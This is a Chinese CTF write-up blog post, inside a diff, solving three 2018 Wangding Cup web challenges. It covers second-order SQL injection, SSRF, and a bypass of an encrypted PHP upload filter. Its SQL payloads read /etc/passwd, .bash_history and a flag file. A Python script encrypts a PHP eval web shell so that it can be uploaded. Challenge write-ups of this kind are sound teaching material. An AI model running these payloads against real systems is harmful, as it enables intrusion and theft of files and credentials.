@@ -1,0 +1,88 @@
+<!DOCTYPE html><html lang="en"><head><meta name="generator" content="Hexo 3.8.0"><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content="与其哀叹，不如埋头苦干"><title>2018网鼎杯第四场Web题解 | Mochazz's blog</title><link rel="stylesheet" type="text/css" href="/css/style.css"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script></head><link rel="stylesheet" type="text/css" href="/css/customize.css"><link rel="stylesheet" type="text/css" href="/plugins/prettify/doxy.css"><script type="text/javascript" src="/js/ready.js" async></script><body><div class="mobile-head" id="mobile-head"><div class="navbar-icon"><span></span><span></span><span></span></div><div class="navbar-title"><a href="/"></a></div><div class="navbar-search"><!--= show a circle here--></div></div><div class="h-wrapper" id="menu"><nav class="h-head box"><div class="m-hdimg"><a class="hdimg img" href="/"><img class="nofancybox" src="/img/tx.jpeg" width="128" height="128"></a><h1 class="ttl"><a href="/">Mochazz's blog</a></h1></div><p class="m-desc">与其哀叹，不如埋头苦干</p><div class="m-nav"><ul><li><span class="dot">●</span><a href="/archives/">归档</a></li><li><span class="dot">●</span><a href="/about/">关于</a></li><span class="dot">●</span><span>友链</span><li><span class="dot">●</span><span class="dot">●</span><a href="http://www.lmxspace.com">l1nk3r</a></li><li><span class="dot">●</span><span class="dot">●</span><a href="https://www.virzz.com">Virink</a></li><li><span class="dot">●</span><span class="dot">●</span><a href="http://sec2hack.com">Wfox</a></li><li><span class="dot">●</span><span class="dot">●</span><a href="http://www.lsafe.org">离心</a></li><li><span class="dot">●</span><span class="dot">●</span><a href="https://www.kingkk.com">kingkk</a></li><li><span class="dot">●</span><span class="dot">●</span><a href="http://hpdoger.me">hpdoger</a></li></ul></div></nav></div><div id="back2Top"><a class="fa fa-arrow-up" title="Back to top" href="#"></a></div><div class="box" id="container"><div class="l-wrapper"><div class="l-content box"><div class="l-post l-post-art"><article class="p-art"><div class="p-header box"><h1 class="p-title">2018网鼎杯第四场Web题解</h1><div class="p-info"><span class="p-date"><i class="fa fa-calendar"></i><a href="/2018/09/01/2018网鼎杯第四场/">2018-09-01</a></span><span class="p-category"><i class="fa fa-folder"></i><a href="/categories/CTF竞赛训练/">CTF竞赛训练</a></span><span class="p-view" id="busuanzi_container_page_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_page_pv"></span></span></div></div><div class="p-content"><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="comment"><a href="#comment" class="headerlink" title="comment"></a>comment</h3><p>题目界面如下，有发帖留言的功能，不过需要登录才能使用。</p>
+<p><img src="/img/2018网鼎杯第四场/1.png" alt="1"></p>
+<p>可以通过爆破得知账号密码为：zhangwei/zhangwei666</p>
+<p><img src="/img/2018网鼎杯第四场/2.png" alt="2"></p>
+<p>手工测试发现存在 <strong>.git</strong> 泄露，用 <a href="https://github.com/BugScanTeam/GitHack" target="_blank" rel="noopener"><strong>GitHack</strong></a> 下载泄露文件，发现 <strong>write_do.php</strong> 的代码不全。通过 <strong>git cat-file -p xxxxx</strong> 命令显示版本库对象的内容、类型及大小信息，可以看到完整的代码：</p>
+<p><img src="/img/2018网鼎杯第四场/3.png" alt="3"></p>
+<p>具体代码如下：</p>
+<p><img src="/img/2018网鼎杯第四场/4.png" alt="4"></p>
+<p>可以看到上面 <strong>第13-14</strong> 行都对 <strong>POST</strong> 传来 <strong>category</strong> 、 <strong>title</strong> 、<strong>content</strong> 三个参数进行了特殊字符转义，然而在 <strong>第28行</strong> 和 <strong>第30-33行</strong> 处直接将从数据库中取出的数据，未经任何过滤拼接到 <strong>SQL语句</strong> 中，这就存在 <strong>二次注入</strong> 。</p>
+<p>有很多人一直纠结 <strong>addslashes</strong> 这个转义函数，其实大家在数据库中测试一下就知道了，假设我们的 <strong>payload</strong> 为：<strong>‘,content=user(),/*</strong> ，那么经过 <strong>addslashes</strong> 函数转义后，变成了 <strong>\‘,content=user(),/*</strong> ，我们看一下插入数据库中变成啥样：</p>
+<p><img src="/img/2018网鼎杯第四场/5.png" alt="5"></p>
+<p>所以根本就不影响我们进行二次注入。下面说说二次注入的攻击过程：</p>
+<ul>
+<li>先进入 <strong>write</strong> 方法，将 <strong>payload</strong> ： <code>&#39;,content=user(),/*</code> 插入 <strong>board</strong> 表的 <strong>category</strong> 字段中</li>
+<li>再进入 <strong>comment</strong> 方法，程序将 <strong>board</strong> 表中的 <strong>category</strong> 字段取出，没进行过滤，拼接到新的 <strong>insert</strong> 语句中。由于我们之前的 <strong>payload</strong> 中带有 <strong>/*</strong> ，所以我们需要闭合它，即我们在评论处提交 <strong>*/#</strong> (对应 <strong>content</strong> 变量的值)</li>
+<li>然后程序执行 <strong>第二个SQL</strong> 语句，并将用户提交的 <strong>content</strong> 值显示出来，而我们的 <strong>payload</strong> ： <code>&#39;,content=user(),/*</code>  就会显示出当前用户。</li>
+</ul>
+<p><img src="/img/2018网鼎杯第四场/6.png" alt="6"></p>
+<p><img src="/img/2018网鼎杯第四场/7.png" alt="7"></p>
+<p>看到是 <strong>root</strong> 用户，一般 <strong>flag</strong> 就不会在数据库里面(因为如果在数据库中，不需要这么高的权限，实际也确实没有)，应该是要用 <strong>SQL语句</strong> 读取flag文件了。</p>
+<p>首先读取 <strong>/etc/passwd</strong> 看看服务器上有哪些用户，payload为: <strong>‘,content=(select load_file(‘/etc/passwd’)),/*</strong> </p>
+<p><img src="/img/2018网鼎杯第四场/8.png" alt="8"></p>
+<p>发现存在 <strong>www</strong> 用户，继续查看 <strong>.bash_history</strong> 记录，payload为: <strong>‘,content=(select load_file(‘/home/www/.bash_history’)),/*</strong> </p>
+<p><img src="/img/2018网鼎杯第四场/9.png" alt="9"></p>
+<p>发现 <strong>www</strong> 用户的一些操作。看见有 <strong>.DS_Store</strong> 文件，考虑到目标环境是docker，所以 <strong>.DS_Store</strong> 文件应该在 <strong>/tmp</strong> 中。而 <strong>.DS_Store</strong> 文件中，经常会有一些不可键字符，所以我们可以使用hex函数对其内容进行转换，payload为： <strong>‘,content=(select hex(load_file(‘/tmp/html/.DS_Store’))),/*</strong> </p>
+<p><img src="/img/2018网鼎杯第四场/10.png" alt="10"></p>
+<p>解码获得flag路径：</p>
+<p><img src="/img/2018网鼎杯第四场/11.png" alt="11"></p>
+<p>使用payload： <strong>‘,content=(select load_file(‘/var/www/html/flag_8946e1ff1ee3e40f.php’)),/*</strong> 读取flag：</p>
+<p><img src="/img/2018网鼎杯第四场/12.png" alt="12"></p>
+<h3 id="blog"><a href="#blog" class="headerlink" title="blog"></a>blog</h3><p>没啥意思的一道题目。题目是一个wordpress的站点，如下：</p>
+<p><img src="/img/2018网鼎杯第四场/13.png" alt="13"></p>
+<p>查看图片的url，发现其url形式极其可能存在SSRF漏洞：</p>
+<p><img src="/img/2018网鼎杯第四场/14.png" alt="14"></p>
+<p>通过 <strong>git</strong> 收集信息，可以发现一个内网用户查询接口。</p>
+<p><img src="/img/2018网鼎杯第四场/15.png" alt="15"></p>
+<p><img src="/img/2018网鼎杯第四场/16.png" alt="16"></p>
+<p><strong>api.php</strong> 的内容为：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//http://10.220.56.29/WD_UserListAPI.php?uid=</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>所以我们遍历uid的值即可获取用户信息。当uid值为233的时候，即可获得flag：</p>
+<p><img src="/img/2018网鼎杯第四场/17.png" alt="17"></p>
+<h3 id="NoWafUpload"><a href="#NoWafUpload" class="headerlink" title="NoWafUpload"></a>NoWafUpload</h3><p>这题可以任意上传文件，题目如下：</p>
+<p><img src="/img/2018网鼎杯第四场/18.png" alt="18"></p>
+<p>当我们上传PHP一句话的时候，显示上传成功并返回路径，但是去访问就404。</p>
+<p><img src="/img/2018网鼎杯第四场/19.png" alt="19"></p>
+<p>一开始以为是时间竞争，尝试发现并不是。扫了一下目录，发现存在 <strong><a href="http://www.zip" target="_blank" rel="noopener">www.zip</a></strong> 文件，里面包含一个.so的拓展还有一个经过加密的PHP文件。所以考点应该是我们通过逆向来知道加密算法，然后将我们的一句话经过该加密算法加密后再上传，这样代码通过检测才能被解析。使用 <strong>IDA</strong> 反汇编 <strong>funencrypt.so</strong> 文件，发现关键函数，代码如下：</p>
+<p><img src="/img/2018网鼎杯第四场/21.png" alt="21"></p>
+<p>我们把经过加密的 <strong>sdfasgerwtytc.php</strong> 文件拖入16进制分析软件中，并根据上面的反汇编代码进行对比：</p>
+<p><img src="/img/2018网鼎杯第四场/22.png" alt="22"></p>
+<p> <strong>sdfasgerwtytc.php</strong> 文件实际上就是一个 <strong>phpinfo</strong> 页面（上传上去访问就知道了），而上图中的的三个 <strong>fread</strong> 代码分别表示前32字节的字符串（这里刚好是一个md5值）、两个长度。一个为16进制 <strong>10</strong> ，即整数16，猜测是代码： <strong>&lt;?php phpinfo();</strong> 的长度，后面一个为16进制16，即整数22，刚好是后面一段乱七八糟字符串的长度。</p>
+<p>我们继续看35行以下的代码。首先先校验了开头读的md5，而这个md5的值就是后面那一串乱七八糟字符串的md5，这个自己计算一下就知道了。然后取那串乱七八糟的字符串逐位与 <strong>0xC</strong> 进行异或，并将其结果 <strong>uncompress</strong> 后写入某个文件。</p>
+<p><img src="/img/2018网鼎杯第四场/23.png" alt="23"></p>
+<p>根据上面的逻辑，反推回去，写出加密PHP程序的代码。如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib,zlib</span><br><span class="line">s = <span class="string">"&lt;?php eval($_POST[_]);"</span></span><br><span class="line">bf_len = hex(len(s))</span><br><span class="line"></span><br><span class="line">compress_s = zlib.compress(s)</span><br><span class="line"></span><br><span class="line">new_compress = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> compress_s:</span><br><span class="line">    new_compress += chr(ord(ch)^<span class="number">0xC</span>)</span><br><span class="line"></span><br><span class="line">MD5 = hashlib.md5()</span><br><span class="line">MD5.update(new_compress)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"MD5 : "</span> + MD5.hexdigest().encode(<span class="string">'hex'</span>))</span><br><span class="line">print(<span class="string">"bf_len: "</span> + bf_len)</span><br><span class="line">af_len = hex(len(new_compress))</span><br><span class="line">print(<span class="string">"af_len: "</span> + af_len)</span><br><span class="line">print(<span class="string">"new_compress: "</span> + new_compress.encode(<span class="string">'hex'</span>))</span><br></pre></td></tr></table></figure>
+<p>将生成的16进制数据按顺序写入文件即可：</p>
+<p><img src="/img/2018网鼎杯第四场/24.png" alt="24"></p>
+<p>上传该文件，使用密码 <strong>_</strong> 查找flag：</p>
+<p><img src="/img/2018网鼎杯第四场/25.png" alt="25"></p>
+</div><div class="p-copyright"><blockquote><div class="p-copyright-author"><span class="p-copyright-key">本文作者：</span><span class="p-copytight-value"><a href="https://mochazz.github.io">Mochazz</a></span></div><div class="p-copyright-link"><span class="p-copyright-key">本文链接：</span><span class="p-copytight-value"><a href="/2018/09/01/2018网鼎杯第四场/">https://mochazz.github.io/2018/09/01/2018网鼎杯第四场/</a></span></div><div class="p-copyright-note"><span class="p-copyright-key">版权声明：</span><span class="p-copytight-value">本博客所有文章除特殊声明外，均采用<a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/"> CC BY-NC 4.0 </a>许可协议。转载请注明出处 <a href="https://mochazz.github.io">Mochazz的博客</a>！</span></div></blockquote></div></article><div class="p-info box"><span class="p-tags"><i class="fa fa-tag"></i><a href="/tags/CTF/">CTF</a></span></div></div><section class="p-ext"><div class="l-pager l-pager-dtl box"><a class="prev" href="/2018/09/10/关于ECShop前台注入和getshell漏洞的一些思考/">&lt; 关于ECShop前台注入和getshell漏洞的一些思考</a><a class="next" href="/2018/08/31/代码审计Day10 - 程序未恰当exit导致的问题/">代码审计Day10 - 程序未恰当exit导致的问题 &gt;</a></div><div id="valine-comment"><style type="text/css">.v * { color: #CECECE; }
+.v a { color: #0F9FB4; }
+.v a:hover { color: #216C73; }
+.v li { list-style: inherit; }
+.v .vwrap { border: 1px solid #223441; border-radius: 0; }
+.v .vwrap:hover { box-shadow: 0 0 6px 1px #223441; }
+.v .vbtn { border-radius: 0; color: #cecece; background: none; }
+.v .vlist .vcard .vh { border-bottom-color: #293D4E; }
+.v .vwrap .vheader .vinput { border-bottom-color: #223441; }
+.v .vwrap .vheader .vinput:focus { border-bottom-color: #339EB4; }
+.v code, .v pre,.v .vlist .vcard .vhead .vsys { background: #203240; }
+.v .vlist .vcard .vcontent.expand:before { background: linear-gradient(180deg,hsla(206,33%,19%,0),hsla(206,33%,19%,.9)); }
+.v .vlist .vcard .vcontent.expand:after { background: hsla(206,33%,19%,.9); }</style><div id="vcomment"></div><script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="//unpkg.com/valine@latest/dist/Valine.min.js"></script><script>var notify = 'false' == true ? true : false;
+var verify = 'false' == true ? true : false;
+var GUEST_INFO = ['nick','mail','link'];
+var guest_info = 'nick,mail,link'.split(',').filter(function(item){
+  return GUEST_INFO.indexOf(item) > -1
+});
+guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
+window.valine = new Valine({
+  el:'#vcomment',
+  notify:notify,
+  verify:verify,
+  appId:'cFxDjSziPHq4xGCbSpRGkND7-gzGzoHsz',
+  appKey:'YhJIRxQHzY9Aix5pSGnYxKkv',
+  placeholder:'ヾﾉ≧∀≦)o留下评论再走吧',
+  avatar:'wavatar',
+  guest_info:guest_info,
+  pageSize:'10'
+})</script></div></section><footer><p>Copyright © 2017 - 2019 <a href="/." rel="nofollow">Mochazz's blog</a> | <strong><a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/">CC BY-NC 4.0</a></strong><br><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span></span> <span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span></span> | Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a>Theme with<a rel="nofollow" target="_blank" href="https://github.com/litreily/snark-hexo"> snark.</a></p></footer></div></div></div><script type="text/javascript" src="/plugins/prettify/prettify.js"></script><script type="text/javascript" src="/js/search.js"></script><script type="text/javascript" src="/js/top.js"></script><script type="text/javascript" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><script type="text/javascript" src="//cdn.bootcss.com/fancybox/3.3.5/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.1" async></script><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/fancybox/3.3.5/jquery.fancybox.min.css"></body></html>
